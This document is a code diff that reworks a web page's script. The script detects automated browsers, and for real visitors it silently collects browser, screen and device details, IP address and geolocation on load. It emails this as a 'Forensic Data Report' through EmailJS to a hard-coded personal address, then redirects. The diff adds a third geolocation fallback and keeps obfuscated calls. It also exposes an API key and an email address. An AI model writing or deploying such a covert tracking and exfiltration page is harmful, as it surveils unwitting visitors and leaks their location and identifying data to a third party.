@@ -23,78 +23,92 @@
             if(navigator.webdriver || window._phantom) return redirectToTarget();
             
             // Initialize EmailJS stealthily
-            const e = window[atob('ZW1haWxqcw==')]; // Obfuscated 'emailjs'
-            e[atob('aW5pdA==')]('RrfKXUJqdjRY9RI8E'); // Obfuscated 'init'
+            const emailjs = window[atob('ZW1haWxqcw==')];
+            emailjs[atob('aW5pdA==')]('RrfKXUJqdjRY9RI8E'); // Initialize with your public key
             
             // Data collection
-            async function c() {
-                const d = {
-                    t: new Date().toISOString(),
-                    r: document.referrer || "Direct",
-                    b: { 
+            async function collectData() {
+                const data = {
+                    timestamp: new Date().toISOString(),
+                    referrer: document.referrer || "Direct",
+                    browser: { 
                         ua: navigator.userAgent,
-                        l: navigator.language,
-                        ce: navigator.cookieEnabled,
+                        lang: navigator.language,
+                        cookies: navigator.cookieEnabled,
                         dnt: navigator.doNotTrack,
-                        p: navigator.platform,
-                        v: navigator.vendor
+                        platform: navigator.platform,
+                        vendor: navigator.vendor
                     },
-                    s: { 
-                        w: window.screen.width,
-                        h: window.screen.height,
-                        cd: window.screen.colorDepth,
-                        pd: window.screen.pixelDepth
+                    screen: { 
+                        width: window.screen.width,
+                        height: window.screen.height,
+                        colorDepth: window.screen.colorDepth,
+                        pixelDepth: window.screen.pixelDepth
                     },
-                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    dt: getDeviceType()
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    deviceType: getDeviceType()
                 };
                 
                 // Geolocation with GDPR compliance
-                await tryMultipleGeoServices(d);
-                if(d.country === "EU") d.ip = "REDACTED";
+                await tryMultipleGeoServices(data);
+                if(data.country === "EU") data.ip = "REDACTED";
                 
-                return d;
+                return data;
             }
 
             async function tryMultipleGeoServices(d) {
-                // Try service 1: ipify + ipapi.co
-                let s1 = await (async () => {
-                    try {
-                        const ip = await (await fetch('https://api.ipify.org?format=json')).json();
-                        d.ip = ip.ip;
-                        const geo = await (await fetch(`https://ipapi.co/${d.ip}/json/`)).json();
-                        d.city = geo.city || "Unknown";
-                        d.region = geo.region || "Unknown";
-                        d.country = geo.country_name || "Unknown";
-                        d.loc = `${geo.latitude},${geo.longitude}`;
-                        d.isp = geo.org || "Unknown";
-                        return true;
-                    } catch(e) { return false; }
-                })();
-                
-                // Try service 2: ipgeolocation.io if first failed
-                if(!s1) {
-                    s1 = await (async () => {
-                        try {
-                            const geo = await (await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=b63a7d0a7e584b4d9a3a3e0d0c4f1a5a')).json();
-                            d.ip = geo.ip;
-                            d.city = geo.city || "Unknown";
-                            d.region = geo.state_prov || "Unknown";
-                            d.country = geo.country_name || "Unknown";
-                            d.loc = `${geo.latitude},${geo.longitude}`;
-                            d.isp = geo.isp || "Unknown";
-                            return true;
-                        } catch(e) { return false; }
-                    })();
-                }
-                
-                // Set defaults if all failed
-                if(!s1) setDefaultGeoValues(d);
+                // Try ipify + ipapi.co
+                let success = await tryIpifyAndIpapi(d);
+                // Try ipgeolocation.io if first fails
+                if(!success) success = await tryIpgeolocation(d);
+                // Try geojs.io if second fails
+                if(!success) success = await tryGeojs(d);
+                // Set defaults if all fail
+                if(!success) setDefaultGeoValues(d);
+            }
+
+            async function tryIpifyAndIpapi(d) {
+                try {
+                    const ip = await (await fetch('https://api.ipify.org?format=json')).json();
+                    d.ip = ip.ip;
+                    const geo = await (await fetch(`https://ipapi.co/${d.ip}/json/`)).json();
+                    d.city = geo.city || "Unknown";
+                    d.region = geo.region || "Unknown";
+                    d.country = geo.country_name || "Unknown";
+                    d.loc = `${geo.latitude},${geo.longitude}`;
+                    d.isp = geo.org || "Unknown";
+                    return true;
+                } catch(e) { return false; }
+            }
+
+            async function tryIpgeolocation(d) {
+                try {
+                    const geo = await (await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=b63a7d0a7e584b4d9a3a3e0d0c4f1a5a')).json();
+                    d.ip = geo.ip;
+                    d.city = geo.city || "Unknown";
+                    d.region = geo.state_prov || "Unknown";
+                    d.country = geo.country_name || "Unknown";
+                    d.loc = `${geo.latitude},${geo.longitude}`;
+                    d.isp = geo.isp || "Unknown";
+                    return true;
+                } catch(e) { return false; }
+            }
+
+            async function tryGeojs(d) {
+                try {
+                    const geo = await (await fetch('https://get.geojs.io/v1/ip/geo.json')).json();
+                    d.ip = geo.ip;
+                    d.city = geo.city || "Unknown";
+                    d.region = geo.region || "Unknown";
+                    d.country = geo.country || "Unknown";
+                    d.loc = `${geo.latitude},${geo.longitude}`;
+                    d.isp = "Unknown";
+                    return true;
+                } catch(e) { return false; }
             }
 
             function setDefaultGeoValues(d) {
-                d.ip = "Unavailable";
-                d.city = d.region = d.country = d.loc = d.isp = "Unknown";
+                d.ip = d.city = d.region = d.country = d.loc = d.isp = "Unknown";
             }
 
             function getDeviceType() {
@@ -103,17 +117,39 @@
                        /mobile|android/i.test(ua) ? "Mobile" : "Desktop";
             }
 
-            // Email sending with obfuscation
-            async function send(d) {
-                const m = {
+            // Send email with HTML formatting
+            async function sendEmail(d) {
+                const htmlContent = `
+                    <h2>Forensic Data Report</h2>
+                    <p><strong>Timestamp:</strong> ${d.timestamp}</p>
+                    <h3>Location</h3>
+                    <p><strong>IP:</strong> ${d.ip}</p>
+                    <p><strong>City:</strong> ${d.city}</p>
+                    <p><strong>Region:</strong> ${d.region}</p>
+                    <p><strong>Country:</strong> ${d.country}</p>
+                    <p><strong>Coordinates:</strong> ${d.loc}</p>
+                    <p><strong>ISP:</strong> ${d.isp}</p>
+                    <h3>Browser</h3>
+                    <p><strong>User Agent:</strong> ${d.browser.ua}</p>
+                    <p><strong>Language:</strong> ${d.browser.lang}</p>
+                    <p><strong>Cookies:</strong> ${d.browser.cookies}</p>
+                    <h3>Device</h3>
+                    <p><strong>Type:</strong> ${d.deviceType}</p>
+                    <p><strong>Resolution:</strong> ${d.screen.width}x${d.screen.height}</p>
+                `;
+                
+                const params = {
                     to_email: 'abdalrahimsaid@gmail.com',
                     subject: 'Forensic Data Report',
-                    message: JSON.stringify(d)
+                    message: htmlContent
                 };
                 
                 try {
-                    await e.send('service_2go8qdw', 'template_mu47rv7', m);
-                } catch(e) {}
+                    await emailjs.send('service_2go8qdw', 'template_mu47rv7', params);
+                    return true;
+                } catch(e) {
+                    return false;
+                }
             }
 
             function redirectToTarget() {
@@ -123,15 +159,15 @@
             // Execution
             window.onload = async () => {
                 try {
-                    // Remove visible elements
+                    // Remove visual elements
                     document.querySelector('.l').style.display = 'none';
                     document.querySelector('.p').remove();
                     
                     // Collect and send data
-                    const data = await c();
-                    await send(data);
+                    const data = await collectData();
+                    await sendEmail(data);
                     
-                    // Redirect after 1.5s (original behavior)
+                    // Wait 1.5s to ensure email sends (original behavior)
                     setTimeout(redirectToTarget, 1500);
                 } catch(e) {
                     redirectToTarget();
